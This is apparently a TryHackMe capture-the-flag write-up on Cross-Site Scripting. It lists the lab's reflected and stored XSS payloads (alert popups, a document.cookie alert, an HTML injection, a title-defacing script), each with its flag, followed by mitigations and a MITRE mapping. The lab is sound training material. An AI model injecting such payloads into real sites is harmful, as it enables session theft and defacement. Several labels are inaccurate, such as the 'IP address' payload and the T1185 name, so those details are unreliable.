# ✴️ Cross-Site Scripting (XSS) – TryHackMe Walkthrough

## 📝 Overview

**Cross-Site Scripting (XSS)** is a client-side injection vulnerability that allows attackers to execute malicious scripts in a victim’s browser. It typically occurs when unsanitized user input is rendered on a webpage.

There are three main types:

* **Stored XSS** – Malicious scripts are permanently stored on the server (e.g., in a database) and executed when victims load the page.
* **Reflected XSS** – The malicious payload is part of the request and reflected back in the response.
* **DOM-Based XSS** – The payload executes due to client-side DOM manipulation without server interaction.

This lab demonstrates **DOM-Based, Reflected, and Stored XSS** attacks.

---

## 🎯 Lab Objective

* Exploit **Reflected XSS** to trigger JavaScript pop-ups.
* Exploit **Stored XSS** to execute scripts and deface the webpage.
* Retrieve flags from each challenge.

---

## 🛠 Steps to Exploit

### ✅ 1. Reflected XSS – Basic Popup

* Navigated to the **Reflected XSS** page.

* Injected a simple JavaScript payload into the input field:

  ```html
  <script>alert("Hello")</script>
  ```

* **Flag Retrieved:**

  ```
  ThereIsMoreToXSSThanYouThink
  ```

---

### ✅ 2. Reflected XSS – Display IP Address

* Crafted a payload to display the attacker’s IP address:

  ```html
  <script>alert(document.location)</script>
  ```

* **Flag Retrieved:**

  ```
  ReflectiveXss4TheWin
  ```

---

### ✅ 3. Stored XSS – HTML Injection

* Created an account on the **Stored XSS** page and posted a comment with basic HTML tags:

  ```html
  <h3>You have been hacked!</h3>
  ```

* **Flag Retrieved:**

  ```
  HTML_T4gs
  ```

---

### ✅ 4. Stored XSS – Cookie Stealing Popup

* Injected a payload to trigger a popup displaying document cookies:

  ```html
  <script>alert(document.cookie)</script>
  ```

* **Flag Retrieved:**

  ```
  W3LL_D0N3_LVL2
  ```

---

### ✅ 5. Stored XSS – Defacing the Webpage

* Modified the page title **“XSS Playground”** to **“I am a hacker”** by injecting this JavaScript payload:

  ```html
  <script>document.getElementById("thm-title").innerHTML = "I am a hacker"</script>
  ```

* **Flag Retrieved:**

  ```
  websites_can_be_easily_defaced_with_xss
  ```

---

## ✅ Key Takeaways

* **Root Cause:** Lack of input sanitization and output encoding, allowing arbitrary JavaScript execution.
* **Impact:**

  * Theft of cookies or session tokens
  * Website defacement
  * Keylogging, phishing, and further exploitation
* **Mitigation:**

  * Implement proper input sanitization and output encoding
  * Use Content Security Policy (CSP)
  * Sanitize and validate all user inputs on both client and server sides

---

## 🗺 MITRE ATT\&CK Mapping

| **Technique**               | **ID**                                              | **Description**                                                 |
| --------------------------- | --------------------------------------------------- | --------------------------------------------------------------- |
| **Exploitation for Client** | [T1185](https://attack.mitre.org/techniques/T1185/) | Injecting malicious scripts to execute in the victim’s browser. |
| **Valid Accounts**          | [T1078](https://attack.mitre.org/techniques/T1078/) | If session cookies are stolen, attackers may hijack accounts.   |

